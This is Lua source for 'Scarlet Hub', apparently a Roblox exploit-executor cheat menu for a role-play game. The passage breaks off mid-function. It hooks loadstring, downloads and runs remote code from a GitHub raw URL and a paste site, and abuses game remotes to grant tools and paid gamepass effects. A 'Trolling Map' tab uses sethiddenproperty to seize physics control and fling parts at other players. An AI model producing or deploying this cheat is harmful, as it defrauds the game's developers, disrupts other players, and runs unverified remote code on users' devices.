-- BLOQUEADOR DO SLAYER HUB
local oldLoadstring;
oldLoadstring = hookfunction(loadstring, function(code, ...)
    -- Se o código tentar carregar algo relacionado ao Slayer Hub, bloqueia
    if type(code) == "string" and string.match(string.lower(code), "slayer") then
        warn("[Proteção] Tentativa de carregar o Slayer Hub bloqueada com sucesso!")
        return function() end -- Retorna uma função vazia para não quebrar o script
    end
    return oldLoadstring(code, ...)
end)

-- Seu código original de cooldown de 20 segundos abaixo:
local ultimaExecucaoGlobal = _G.UltimaExecucaoGlobal or 0
local TEMPO_ESPERA = 20

if tick() - ultimaExecucaoGlobal < TEMPO_ESPERA then
    local tempoRestante = math.ceil(TEMPO_ESPERA - (tick() - ultimaExecucaoGlobal))
    print("Aguarde mais " .. tempoRestante .. " segundos.")
    return
end
_G.UltimaExecucaoGlobal = tick()

-- Aqui você executa o seu script principal (se necessário)
print("Script limpo executado!")

-- Bio
game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer(unpack({
    "RolePlayBio",
    "| Scarlet Hub best script |",
}))

-- Nome
game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer(unpack({
    "RolePlayName",
    "[ Scarlet Hub User ]",
}))

-- Cor da Bio — VERMELHO
game:GetService("ReplicatedStorage").RE["1RPNam1eColo1r"]:FireServer(unpack({
    "PickingRPBioColor",
    Color3.new(1, 0, 0) -- Vermelho
}))

-- Cor do Nome — PRETO
game:GetService("ReplicatedStorage").RE["1RPNam1eColo1r"]:FireServer(unpack({
    "PickingRPNameColor",
    Color3.new(0, 0, 0) -- Preto
}))


local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/92373839838383388273/Qoiqnmbzxbjswooa282873289192-2-k8-kakns-8-9---82873832938u/refs/heads/main/ScarletHub_Library_FIXED%20(2).lua"))()

local Window = redzlib:MakeWindow({

  Title = " The Scarlet Hub",
  SubTitle = "By: Vitinzw22 and Cafezin",
  SaveFolder = "testando | v5"
})

Window:AddMinimizeButton({
    Button = {
        Image = "rbxassetid://71658075157444",
        BackgroundTransparency = 100
    },
    Corner = {
        CornerRadius = UDim.new(35, 1)
    },
})


task.delay(1, function()
   Window:Dialog({
      Title = "      BEM-VINDO AO SCARLET HUB",
      Text = "             !espero que se divirta!",
      Options = {
        {
           "Discord",
           function()
              local discordLink = ""
              if setclipboard then
                setclipboard(discordLink)
                Libary:Notify({
                   Title = "",
                   Text = "",
                   Duration = 5
                })
              else
                Libary:Notify({
                   Title = "TRAKIS HUB ATUALIZADO!",
                   Text = "Seu executor não permite copiar texto automaticamente.",
                   Duration = 5
                })
              end
           end
        },
        {
           "Open",
           function()
              Libary:Notify({
                Title = "Trakis hub ",
                Text = "Bem-vindo(a) ao melhor Hub!",
                Duration = 5
              })
           end
        }
      }
   })
end)

print("Scarlet Hub")

local InfoTab = Window:MakeTab({ "Informations", "info" })

InfoTab:AddSection({ "ENTRE NO NOSSO DISCORD!" })

InfoTab:AddDiscordInvite({
   Name = "entre no nosso server do Discord!",
   Description = "ainda nao temos mais logo teremos.",
   Logo = "rbxassetid://71658075157444",
   Invite = "",
})

InfoTab:AddSection({ "Credits" })
InfoTab:AddParagraph({ "Owner", "cafezin and vitin" })
InfoTab:AddParagraph({ "Programmers", "cafezin" })

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local Section = InfoTab:AddSection({"Script Usage Time:"})
local playTimeParagraph = InfoTab:AddParagraph({
   Title = "00:00:00",
   Text = "Script Usage Time:"
})

local seconds = 0

task.spawn(function()
   while true do
      task.wait(1)
      seconds += 1

      local hours = math.floor(seconds / 3600)
      local minutes = math.floor((seconds % 3600) / 60)
      local secs = seconds % 60

      local timeFormatted = string.format("%02d:%02d:%02d", hours, minutes, secs)
      playTimeParagraph:SetTitle(timeFormatted)
   end
end)

local Section = InfoTab:AddSection({"Your Time On The Server"})
local serverTimeParagraph = InfoTab:AddParagraph({
   Title = "00:00:00",
   Text = "Your Time On The Server"
})

task.spawn(function()
   while true do
      task.wait(0.5)
      local seconds = math.floor(workspace.DistributedGameTime)

      local hours = math.floor(seconds / 3600)
      local minutes = math.floor((seconds % 3600) / 60)
      local secs = seconds % 60

      local formatted = string.format("%02d:%02d:%02d", hours, minutes, secs)
      serverTimeParagraph:SetTitle(formatted)
   end
end)

InfoTab:AddSection({ "Rejoin" })
InfoTab:AddButton({
   Name = "Rejoin",
   Callback = function()
      local TeleportService = game:GetService("TeleportService")
      TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
   end
})

-- Não copia Skidder, pq eu vou derrubar seu script.(Kita) 

local Tab = Window:MakeTab({"Itens/fun", "package"})

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local RE = ReplicatedStorage:WaitForChild("RE")

local ToolEvent = RE:WaitForChild("1Playe1rTrigge1rEven1t")
local ToolRemote = RE:WaitForChild("1Too1l")

local function CreateToolButton(title, toolName, remoteType)
   Tab:AddButton({
      Title = title,
      Locked = false,
      Callback = function()

        if remoteType == "Function" then
           ToolRemote:InvokeServer(
              "PickingTools",
              toolName
           )

        else
           ToolEvent:FireServer(
              "AcceptedToolToServer",
              toolName,
              LocalPlayer
           )
        end
      end
   })
end

local Tools = {
   {
      Title = "Planador",
      Tool = "Glider"
   },

   {
      Title = "Canhão",
      Tool = "Cannon"
   },

   {
      Title = "Bola de Basquete Dourada",
      Tool = "GoldenBasketball"
   },

   {
      Title = "Balão de Água",
      Tool = "Water Balloon",
      Type = "Function"
   },

   {
      Title = "Lançador de Ovo",
      Tool = "EggLauncher"
   },

   {
      Title = "Cristal Verde",
      Tool = "UraniumRod"
   },

   {
      Title = "Serra Elétrica",
      Tool = "Chainsaw"
   },

   {
      Title = "Ski",
      Tool = "Skis"
   },

   {
      Title = "Money Gun",
      Tool = "MoneyGun"
   },

   {
      Title = "Snowboard",
      Tool = "Snowboard"
   }
}

for _, tool in ipairs(Tools) do
   CreateToolButton(
      tool.Title,
      tool.Tool,
      tool.Type
   )
end


local ShadersTab = Window:MakeTab({ "Shaders", "sun" })
ShadersTab:AddSection({ "Shaders" })
ShadersTab:AddSection({ "Type 1 (Client-Sided)" })

ShadersTab:AddButton({

Name = "Enable Shaders (Irreversible)",

Callback = function()

local workspace = game:GetService("Workspace")

local Lighting = game:GetService("Lighting")

local RunService = game:GetService("RunService")

local Debris = game:GetService("Debris")

local TweenService = game:GetService("TweenService")

local SoundService = game:GetService("SoundService")

local Players = game:GetService("Players")

local player = Players.LocalPlayer

local model = workspace:FindFirstChild("Model")



if model then

    local function setMat(obj)

        for _, c in pairs(obj:GetChildren()) do

            if c:IsA("BasePart") then

                c.Material = Enum.Material.Basalt

            elseif c:IsA("Model") or c:IsA("Folder") then

                setMat(c)

            end

        end

    end

    if model:FindFirstChild("001_SnowStreet") then

        setMat(model["001_SnowStreet"])

    end

    if model:FindFirstChild("Street") then

        for _, o in pairs(model.Street:GetDescendants()) do

            if o:IsA("BasePart") then

                o.Material = Enum.Material.Basalt

            end

        end

    end

    for _, o in pairs(model:GetChildren()) do

        if o:IsA("BasePart") and (o.Name == "Sidewalk" or o.Name == "Wedge") and o.Material == Enum.Material.SmoothPlastic then

            o.Material = Enum.Material.Cobblestone

        end

    end

    model.ChildAdded:Connect(function(obj)

        if obj:IsA("BasePart") and (obj.Name == "Sidewalk" or obj.Name == "Wedge") and obj.Material == Enum.Material.SmoothPlastic then

            obj.Material = Enum.Material.Cobblestone

        end

    end)

end



local soundPart = Instance.new("Part")

soundPart.Size = Vector3.new(1,1,1)

soundPart.Transparency = 1

soundPart.Anchored = true

soundPart.CanCollide = false

soundPart.Parent = workspace

local character = player.Character or player.CharacterAdded:Wait()

local hrp = character:WaitForChild("HumanoidRootPart")



local birdSound = Instance.new("Sound")

birdSound.Name = "BirdsSound"

birdSound.SoundId = "rbxassetid://1237969272"

birdSound.Looped = true

birdSound.Volume = 0.05

birdSound.Parent = soundPart



local wolfSound = Instance.new("Sound")

wolfSound.SoundId = "rbxassetid://6654360741"

wolfSound.Volume = 0.05

wolfSound.Looped = false

wolfSound.Parent = workspace



RunService.Heartbeat:Connect(function()

    if hrp and hrp.Parent then

        soundPart.Position = hrp.Position + Vector3.new(0,10,0)

    end

end)



local function isNight()

    local t = Lighting.ClockTime

    return (t >= 18 or t <= 6)

end



task.spawn(function()

    while true do

        if isNight() then

            if birdSound.IsPlaying then birdSound:Stop() end

            if wolfSound.IsPlaying then wolfSound:Stop() end

            wolfSound:Play()

        else

            if wolfSound.IsPlaying then wolfSound:Stop() end

            if not birdSound.IsPlaying then birdSound:Play() end

        end

        wait(20)

    end

end)



local fountainPart = Instance.new("Part")

fountainPart.Anchored = true

fountainPart.CanCollide = false

fountainPart.Transparency = 1

fountainPart.Size = Vector3.new(1,1,1)

fountainPart.Position = Vector3.new(-27,19,15)

fountainPart.Parent = workspace



local attachment = Instance.new("Attachment")

attachment.Position = Vector3.new(-27,19,15)

attachment.Parent = fountainPart



local fountainSound = Instance.new("Sound")

fountainSound.Name = "FountainSound"

fountainSound.SoundId = "rbxassetid://4766793559"

fountainSound.Looped = true

fountainSound.Volume = 0.03

fountainSound.EmitterSize = 10

fountainSound.RollOffMode = Enum.RollOffMode.Linear

fountainSound.MaxDistance = 100

fountainSound.Parent = attachment

fountainSound:Play()



local customSound = Instance.new("Sound")

customSound.Name = "MyCustomSound"

customSound.SoundId = "rbxassetid://9048659736"

customSound.Volume = 0.01

customSound.Looped = true

customSound.PlayOnRemove = false

customSound.Parent = workspace

customSound:Play()



local active = false

local stars = {}

local shootingStarsFolder = Instance.new("Folder",workspace)

shootingStarsFolder.Name = "ShootingStars"

local STAR_COUNT = 300

local SHOOTING_STAR_CHANCE = 0.3

local SHOOTING_STAR_MAX = 12

local shootingStarCooldown = 0.1



local spaceSound = Instance.new("Sound",workspace)

spaceSound.SoundId = "rbxassetid://1843520836"

spaceSound.Volume = 0.3

spaceSound.Looped = true

spaceSound.Name = "SpaceAmbience"



local function createStar()

    local star = Instance.new("Part")

    local size = math.random(1,3)*0.5

    star.Size = Vector3.new(size,size,size)

    star.Position = Vector3.new(math.random(-1000,1000),math.random(300,700),math.random(-1000,1000))

    star.Anchored = true

    star.CanCollide = false

    star.Material = Enum.Material.Neon

    local colors = {Color3.fromRGB(255,255,255),Color3.fromRGB(255,255,180),Color3.fromRGB(180,200,255)}

    star.Color = colors[math.random(1,#colors)]

    star.Name = "Star"

    star.Parent = workspace

    local light = Instance.new("PointLight",star)

    light.Brightness = 2 + math.random()*1.5

    light.Range = 12

    spawn(function()

        while star.Parent and active do

            star.Transparency = 0.2 + math.sin(tick()*math.random(2,5))*0.2

            RunService.Heartbeat:Wait()

        end

        if star.Parent then star:Destroy() end

    end)

    table.insert(stars,star)

end



local function createShootingStar()

    if not active then return end

    local startPos = Vector3.new(math.random(-1000,1000),math.random(350,600),math.random(-1000,1000))

    local dir = Vector3.new(math.random(-1,1),math.random(-0.1,0.1),math.random(-1,1)).Unit

    local speed = math.random(350,550)

    local isFire = math.random() <= SHOOTING_STAR_CHANCE

    local color = isFire and Color3.fromRGB(255,50,50) or Color3.fromRGB(255,255,220)

    local trailColor = isFire and ColorSequence.new(Color3.fromRGB(255,120,0),Color3.fromRGB(255,230,50)) or ColorSequence.new(Color3.fromRGB(255,255,255),Color3.fromRGB(255,255,180))

    local star = Instance.new("Part")

    star.Size = Vector3.new(0.5,0.5,3)

    star.Position = startPos

    star.Anchored = true

    star.CanCollide = false

    star.Material = Enum.Material.Neon

    star.Color = color

    star.Name = "ShootingStar"

    star.Parent = shootingStarsFolder

    local att0 = Instance.new("Attachment",star)

    local att1 = Instance.new("Attachment",star)

    att1.Position = Vector3.new(0,0,-3)

    local trail = Instance.new("Trail",star)

    trail.Attachment0 = att0

    trail.Attachment1 = att1

    trail.Lifetime = 0.35

    trail.Color = trailColor

    trail.LightEmission = 1

    trail.WidthScale = NumberSequence.new({NumberSequenceKeypoint.new(0,1),NumberSequenceKeypoint.new(1,0)})

    local light = Instance.new("PointLight",star)

    light.Brightness = isFire and 12 or 7

    light.Range = 35

    light.Color = color

    if isFire then

        local fire = Instance.new("Fire",star)

        fire.Heat = 15

        fire.Size = 3.5

        fire.Color = Color3.fromRGB(255,110,0)

        fire.SecondaryColor = Color3.fromRGB(255,210,0)

    end

    local lifetime = math.random(1,1.5)

    local timePassed = 0

    local moveConn

    moveConn = RunService.Heartbeat:Connect(function(dt)

        if not active then moveConn:Disconnect() if star.Parent then star:Destroy() end return end

        timePassed += dt

        if timePassed >= lifetime then moveConn:Disconnect() if star.Parent then star:Destroy() end return end

        local curve = math.sin(timePassed*20)*0.5

        star.Position += (dir+Vector3.new(0,curve,0)).Unit*speed*dt

    end)

    Debris:AddItem(star,4)

end



local function updateSky()

    local hour = Lighting.ClockTime

    local shouldBeActive = hour >= 18 or hour < 6

    if shouldBeActive and not active then

        active = true

        Lighting.FogColor = Color3.fromRGB(10,10,30)

        Lighting.FogEnd = 5000

        Lighting.Brightness = 2

        for _,s in ipairs(stars) do if s and s.Parent then s:Destroy() end end

        stars = {}

        for _,p in ipairs(shootingStarsFolder:GetChildren()) do p:Destroy() end

        for i=1,STAR_COUNT do createStar() end

        spaceSound:Play()

    elseif not shouldBeActive and active then

        active = false

        for _,s in ipairs(stars) do if s and s.Parent then s:Destroy() end end

        stars = {}

        for _,p in ipairs(shootingStarsFolder:GetChildren()) do p:Destroy() end

        spaceSound:Stop()

        Lighting.FogColor = Color3.fromRGB(192,192,192)

        Lighting.FogEnd = 100000

        Lighting.Brightness = 2

    end

end



task.spawn(function()

    while true do

        if active then

            for i=1,SHOOTING_STAR_MAX do

                createShootingStar()

                task.wait(shootingStarCooldown)

            end

        else

            task.wait(1)

        end

    end

end)



task.spawn(function()

    while true do

        updateSky()

        task.wait(1)

    end

end)



local rainFolder = Instance.new("Folder",workspace)

rainFolder.Name = "FakeRain"

local isRaining = false



local birds = Instance.new("Sound",SoundService)

birds.SoundId = "rbxassetid://9111139882"

birds.Volume = 0.2

birds.Looped = true

birds:Play()



local rainSound = Instance.new("Sound",SoundService)

rainSound.SoundId = "rbxassetid://9118823106"

rainSound.Volume = 0.3

rainSound.Looped = true

rainSound:Play()



local thunder = Instance.new("Sound",SoundService)

thunder.SoundId = "rbxassetid://9120018695"

thunder.Volume = 0.4



local function updateBirdSound()

    birds.Volume = isRaining and 0 or 0.2

end



local function spawnRain()

    isRaining = true

    updateBirdSound()

    for i=1,120 do

        local drop = Instance.new("Part")

        drop.Size = Vector3.new(0.1,2,0.1)

        drop.Anchored = true

        drop.CanCollide = false

        drop.Material = Enum.Material.Glass

        drop.Transparency = 0.5

        drop.Color = Color3.fromRGB(160,160,255)

        drop.Position = Vector3.new(math.random(-150,150),100,math.random(-150,150))

        drop.Parent = rainFolder

        local tween = TweenService:Create(drop,TweenInfo.new(1),{Position=drop.Position-Vector3.new(0,60,0)})

        tween:Play()

        Debris:AddItem(drop,1.5)

    end

    wait(1.5)

    isRaining = false

    updateBirdSound()

end


local function lightningStrike()

    local flash = Instance.new("Part")

    flash.Size = Vector3.new(1,1000,1)

    flash.Anchored = true

    flash.CanCollide = false

    flash.Transparency = 0.4

    flash.Material = Enum.Material.Neon

    flash.Color = Color3.new(1,1,1)

    flash.Position = Vector3.new(math.random(-100,100),500,math.random(-100,100))

    flash.Parent = workspace

    Lighting.Brightness = Lighting.Brightness + 1.5

    thunder:Play()

    wait(0.1)

    Lighting.Brightness = Lighting.Brightness - 1.5

    flash:Destroy()

end



for _,part in pairs(workspace:GetDescendants()) do

    if part:IsA("BasePart") and part.Material == Enum.Material.SmoothPlastic then

        part.Reflectance = 0.25

    end

end



task.spawn(function()

    while true do

        spawnRain()

        if math.random() < 0.2 then lightningStrike() end

        wait(1)

    end

end)



Lighting.Brightness = 2

Lighting.GlobalShadows = true

Lighting.OutdoorAmbient = Color3.fromRGB(70, 70, 70)

Lighting.FogColor = Color3.fromRGB(120, 130, 140)

Lighting.FogStart = 80

Lighting.FogEnd = 600

Lighting.EnvironmentSpecularScale = 1

Lighting.EnvironmentDiffuseScale = 0.5



local sky = Instance.new("Sky")

sky.SkyboxBk = "rbxassetid://159454299"

sky.SkyboxDn = "rbxassetid://159454296"

sky.SkyboxFt = "rbxassetid://159454293"

sky.SkyboxLf = "rbxassetid://159454286"

sky.SkyboxRt = "rbxassetid://159454300"

sky.SkyboxUp = "rbxassetid://159454304"

sky.Parent = Lighting



local color = Instance.new("ColorCorrectionEffect", Lighting)

color.Brightness = 0.03

color.Contrast = 0.15

color.Saturation = 0.05

color.TintColor = Color3.fromRGB(255, 240, 220)



local bloom = Instance.new("BloomEffect", Lighting)

bloom.Intensity = 0.8

bloom.Size = 56

bloom.Threshold = 0.9



local sunRays = Instance.new("SunRaysEffect", Lighting)

sunRays.Intensity = 0.05

sunRays.Spread = 0.8



local blur = Instance.new("BlurEffect", Lighting)

blur.Size = 0

end

})

local GamepassTab = Window:MakeTab({"Gamepass", "ticket"})

GamepassTab:AddSection("Effects Avatar")

local effectList = {
   {name = "Corações Amarelos", id = "18635672195", code = "001HeartsYellow"},
   {name = "Corações Verdes", id = "18635727693", code = "002HeartsGreen"},
   {name = "Corações Azuis", id = "18635732186", code = "003HeartsBlue"},
   {name = "Corações Roxos", id = "18635723426", code = "004HeartsPurple"},
   {name = "Corações Rosas", id = "18635726250", code = "005HeartsPink"},
   {name = "Corações Vermelhos", id = "18635729673", code = "006HeartsRed"},
   {name = "Pontos Laranjas", id = "18637252424", code = "010DotsOrange"},
   {name = "Pontos Amarelos", id = "18637263004", code = "011DotsYellow"},
   {name = "Pontos Verdes", id = "18637265264", code = "013DotsGreen"},
   {name = "Pontos Azuis", id = "18637256859", code = "014DotsBlue"},
   {name = "Pontos Roxos", id = "18637261058", code = "015DotsPurple"},
   {name = "Pontos Rosas", id = "18637259328", code = "016DotsPink"},
   {name = "Pontos Vermelhos", id = "18637267290", code = "017DotsRed"},
   {name = "Brilho Branco", id = "18637115654", code = "020TwinkleWhite"},
   {name = "Brilho Amarelo", id = "18637118923", code = "021TwinkleYellow"},
   {name = "Brilho Verde", id = "18637151114", code = "022TwinkleGreen"},
   {name = "Brilho Roxo", id = "18637153880", code = "023TwinklePurple"},
   {name = "Brilho Rosa", id = "18637157071", code = "024TwinklePink"},
   {name = "Brilho Vermelho", id = "18637155247", code = "025TwinkleRed"},
   {name = "Fogo Branco", id = "18637074370", code = "030FireWhite"},
   {name = "Fogo Laranja", id = "18637025451", code = "031FireOrange"},
   {name = "Fogo Verde", id = "18637078598", code = "032FireGreen"},
   {name = "Fogo Azul", id = "18637076370", code = "033FireBlue"},
   {name = "Fogo Roxo", id = "18637070174", code = "034FirePurple"},
   {name = "Fogo Preto", id = "18637072603", code = "035FireBlack"},
   {name = "Corações Pequenos Amarelos", id = "18637339451", code = "040SmallHeartsYellow"},
   {name = "Corações Pequenos Verdes", id = "18637337576", code = "041SmallHeartsGreen"},
   {name = "Corações Pequenos Azuis", id = "18637345162", code = "042SmallHeartsBlue"},
   {name = "Corações Pequenos Roxos", id = "18637335865", code = "043SmallHeartsPurple"},
   {name = "Corações Pequenos Rosas", id = "18637343416", code = "044SmallHeartsPink"},
   {name = "Corações Pequenos Vermelhos", id = "18637341847", code = "045SmallHeartsRed"},
   {name = "Faíscas Brancas", id = "18637383085", code = "050SparksWhite"},
   {name = "Faíscas Verdes", id = "18637385236", code = "051SparksGreen"},
   {name = "Faíscas Azuis", id = "18637386856", code = "052SparksBlue"},
   {name = "Faíscas Roxas", id = "18637442447", code = "053SparksPurple"},
   {name = "Faíscas Rosas", id = "18637445897", code = "054SparksPink"},
   {name = "Faíscas Vermelhas", id = "18637447550", code = "055SparksRed"},
   {name = "Bolhas Verdes", id = "18637493072", code = "061BubbleGreen"},
   {name = "Bolhas Azuis", id = "18637499282", code = "062BubbleBlue"},
   {name = "Bolhas Roxas", id = "18637497343", code = "063BubblePurple"},
   {name = "Bolhas Vermelhas", id = "18637500927", code = "064BubbleRed"},
   {name = "Música Branca", id = "18637675173", code = "070MusicWhite"},
   {name = "Música Verde", id = "18637677789", code = "071MusicGreen"},
   {name = "Música Azul", id = "18637680960", code = "072MusicBlue"},
   {name = "Música Roxa", id = "18637679384", code = "073MusicPurple"},
   {name = "Música Vermelha", id = "18637672698", code = "074MusicRed"},
   {name = "Fumaça Branca", id = "18637791748", code = "080SmokeWhite"},
   {name = "Fumaça Amarela", id = "18637800482", code = "081SmokeYellow"},
   {name = "Fumaça Laranja", id = "18637793920", code = "082SmokeOrange"},
   {name = "Fumaça Verde", id = "18637789299", code = "083SmokeGreen"},
   {name = "Fumaça Azul", id = "18637803021", code = "084SmokeBlue"},
   {name = "Fumaça Roxa", id = "18637813360", code = "085SmokePurple"},
   {name = "Fumaça Vermelha", id = "18637796598", code = "086SmokeRed"},
   {name = "Fumaça Preta", id = "18637798529", code = "087SmokeBlack"},
   {name = "Estrela Branca", id = "18637942956", code = "090StarWhite"},
   {name = "Estrela Laranja", id = "18637946172", code = "091StarOrange"},
   {name = "Estrela Verde", id = "18637934500", code = "092StarGreen"},
   {name = "Estrela Azul", id = "18637940338", code = "093StarBlue"},
   {name = "Estrela Roxa", id = "18637944796", code = "094StarPurple"},
   {name = "Estrela Rosa", id = "18637947820", code = "095StarPink"},
   {name = "Estrela Vermelha", id = "18637949457", code = "096StarRed"}
}

local selectedEffect = effectList[1]

local dropdownOptions = {}
for _, effect in ipairs(effectList) do
   table.insert(dropdownOptions, effect.name)
end

local Dropdown = GamepassTab:AddDropdown({
   Name = "Select Effects",
   Options = dropdownOptions,
   Default = effectList[1].name,
   Callback = function(option)
      for _, effect in ipairs(effectList) do
        if effect.name == option then
           selectedEffect = effect
           break
        end
      end
   end
})

GamepassTab:AddButton({
   Name = "Equip Effects",
   Callback = function()
      game:GetService("ReplicatedStorage").Remotes.ApplyEmmiter:InvokeServer(selectedEffect.id, selectedEffect.code)
   end
})

GamepassTab:AddSection({"Fires"})

local FireTypes = {
   ["Vermelho"] = {
      id = "18637500927",
      emitter = "064BubbleRed"
   },
   ["Roxo"] = {
      id = "18637497343",
      emitter = "063BubblePurple"
   },
   ["Azul"] = {
      id = "18637499282",
      emitter = "062BubbleBlue"
   },
   ["Verde"] = {
      id = "18637493072",
      emitter = "061BubbleGreen"
   }
}

local selectedFire = "Verde"
local fireEnabled = false
local fireLoop = nil

GamepassTab:AddDropdown({
   Name = "Select Fire",
   Description = "",
   Options = {"Vermelho", "Roxo", "Azul", "Verde"},
   Default = "Verde",
   Flag = "FireDropdown",
   Callback = function(option)
      selectedFire = option
   end
})

GamepassTab:AddToggle({
   Name = "Active Fire",
   Description = "",
   Default = false,
   Flag = "FireToggle",
   Callback = function(value)
      fireEnabled = value
      
      if fireEnabled then
        local fireData = FireTypes[selectedFire]
        local args = {
           [1] = fireData.id,
           [2] = fireData.emitter
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ApplyEmmiter"):InvokeServer(unpack(args))
        
        wait(0.5)
        
        fireLoop = task.spawn(function()
           while fireEnabled do
              pcall(function()
                game:GetService("ReplicatedStorage").Remotes.SaveOutfit:InvokeServer(25, "Outfit 25")
                game:GetService("ReplicatedStorage").Remotes.LoadOutfit:InvokeServer(25)
              end)
              wait(0.1)
           end
        end)
      else
        fireEnabled = false
        if fireLoop then
           task.cancel(fireLoop)
           fireLoop = nil
        end
      end
   end
})

GamepassTab:AddSection("Fires and Smokes")

GamepassTab:AddDropdown({
   Name = "Fire Colors",
   Description = "Select the Fire Color",
   Options = {"White", "Orange", "Green", "Blue", "Purple", "Black"},
   Default = "White",
   Flag = "fire_color_dropdown",
   Callback = function(Value)
      -- Tabela com as cores e seus respectivos IDs e códigos
      local fireColors = {
        ["White"] = {
           id = "18637074370",
           code = "030FireWhite"
        },
        ["Orange"] = {
           id = "18637025451", 
           code = "031FireOrange"
        },
        ["Green"] = {
           id = "18637078598",
           code = "032FireGreen"
        },
        ["Blue"] = {
           id = "18637076370",
           code = "033FireBlue"
        },
        ["Purple"] = {
           id = "18637070174",
           code = "034FirePurple"
        },
        ["Black"] = {
           id = "18637072603",
           code = "035FireBlack"
        }
      }
      
      _G.selectedColor = Value
      print("Cor selecionada: " .. Value)
   end
})


GamepassTab:AddButton({
   Name = "Equip Fire Color",
   Callback = function()
      -- Tabela com as cores e seus respectivos IDs e códigos
      local fireColors = {
        ["White"] = {
           id = "18637074370",
           code = "030FireWhite"
        },
        ["Orange"] = {
           id = "18637025451", 
           code = "031FireOrange"
        },
        ["Green"] = {
           id = "18637078598",
           code = "032FireGreen"
        },
        ["Blue"] = {
           id = "18637076370",
           code = "033FireBlue"
        },
        ["Purple"] = {
           id = "18637070174",
           code = "034FirePurple"
        },
        ["Black"] = {
           id = "18637072603",
           code = "035FireBlack"
        }
      }
      
      local selectedColor = _G.selectedColor or "White"
      
      if selectedColor and fireColors[selectedColor] then
        local colorData = fireColors[selectedColor]
        
        local args = {
           [1] = colorData.id,
           [2] = colorData.code
        }
        
        -- Aplica o emmiter com a cor selecionada
        game:GetService("ReplicatedStorage").Remotes.ApplyEmmiter:InvokeServer(unpack(args))
        
        print("Equipado: " .. selectedColor .. " Fire")
      else
        warn("Erro: Cor não encontrada!")
      end
   end
})


GamepassTab:AddDropdown({
   Name = "Smoke Colors",
   Description = "Select the Smoke Color",
   Options = {"White", "Yellow", "Orange", "Green", "Blue", "Purple", "Red", "Black"},
   Default = "White",
   Flag = "smoke_color_dropdown",
   Callback = function(Value)
      -- Tabela com as cores de smoke e seus respectivos IDs e códigos
      local smokeColors = {
        ["White"] = {
           id = "18637791748",
           code = "080SmokeWhite"
        },
        ["Yellow"] = {
           id = "18637800482",
           code = "081SmokeYellow"
        },
        ["Orange"] = {
           id = "18637793920",
           code = "082SmokeOrange"
        },
        ["Green"] = {
           id = "18637789299",
           code = "083SmokeGreen"
        },
        ["Blue"] = {
           id = "18637803021",
           code = "084SmokeBlue"
        },
        ["Purple"] = {
           id = "18637813360",
           code = "085SmokePurple"
        },
        ["Red"] = {
           id = "18637796598",
           code = "086SmokeRed"
        },
        ["Black"] = {
           id = "18637798529",
           code = "087SmokeBlack"
        }
      }
      
      _G.selectedSmokeColor = Value
      print("Cor de smoke selecionada: " .. Value)
   end
})


GamepassTab:AddButton({
   Name = "Equip Smoke Color",
   Callback = function()
      -- Tabela com as cores de smoke e seus respectivos IDs e códigos
      local smokeColors = {
        ["White"] = {
           id = "18637791748",
           code = "080SmokeWhite"
        },
        ["Yellow"] = {
           id = "18637800482",
           code = "081SmokeYellow"
        },
        ["Orange"] = {
           id = "18637793920",
           code = "082SmokeOrange"
        },
        ["Green"] = {
           id = "18637789299",
           code = "083SmokeGreen"
        },
        ["Blue"] = {
           id = "18637803021",
           code = "084SmokeBlue"
        },
        ["Purple"] = {
           id = "18637813360",
           code = "085SmokePurple"
        },
        ["Red"] = {
           id = "18637796598",
           code = "086SmokeRed"
        },
        ["Black"] = {
           id = "18637798529",
           code = "087SmokeBlack"
        }
      }
      
      local selectedSmokeColor = _G.selectedSmokeColor or "White"
      
      if selectedSmokeColor and smokeColors[selectedSmokeColor] then
        local colorData = smokeColors[selectedSmokeColor]
        
        local args = {
           [1] = colorData.id,
           [2] = colorData.code
        }
        
        -- Aplica o emmiter com a cor de smoke selecionada
        game:GetService("ReplicatedStorage").Remotes.ApplyEmmiter:InvokeServer(unpack(args))
        
        print("Equipado: " .. selectedSmokeColor .. " Smoke")
      else
        warn("Erro: Cor de smoke não encontrada!")
      end
   end
}) 



local TrollTab = Window:MakeTab({ "Trolling Map", "map" })

TrollTab:AddSection({ "Skybox by Bazuka" })
TrollTab:AddButton({
 Name = "Skybox by Bazuka",
 Callback = function()
   loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/qZkSict1retkqFIr/raw"))()
   end
})

TrollTab:AddSection({ "Others" })

TrollTab:AddButton({

    Name = "Black Hole",

    Description = "Activating this pulls Parts to your character",

    Callback = function()

        local Players = game:GetService("Players")

local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer

local Workspace = game:GetService("Workspace")



local angle = 1

local radius = 10

local blackHoleActive = false



local function setupPlayer()

    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")



    local Folder = Instance.new("Folder", Workspace)

    local Part = Instance.new("Part", Folder)

    local Attachment1 = Instance.new("Attachment", Part)

    Part.Anchored = true

    Part.CanCollide = false

    Part.Transparency = 1



    return humanoidRootPart, Attachment1

end



local humanoidRootPart, Attachment1 = setupPlayer()



if not getgenv().Network then

    getgenv().Network = {

        BaseParts = {},

        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)

    }



    Network.RetainPart = function(part)

        if typeof(part) == "Instance" and part:IsA("BasePart") and part:IsDescendantOf(Workspace) then

            table.insert(Network.BaseParts, part)

            part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)

            part.CanCollide = false

        end

    end



    local function EnablePartControl()

        LocalPlayer.ReplicationFocus = Workspace

        RunService.Heartbeat:Connect(function()

            sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)

            for _, part in pairs(Network.BaseParts) do

                if part:IsDescendantOf(Workspace) then

                    part.Velocity = Network.Velocity

                end

            end

        end)

    end



    EnablePartControl()

end



local function ForcePart(v)

    if v:IsA("Part") and not v.Anchored and not v.Parent:FindFirstChild("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then

        for _, x in next, v:GetChildren() do

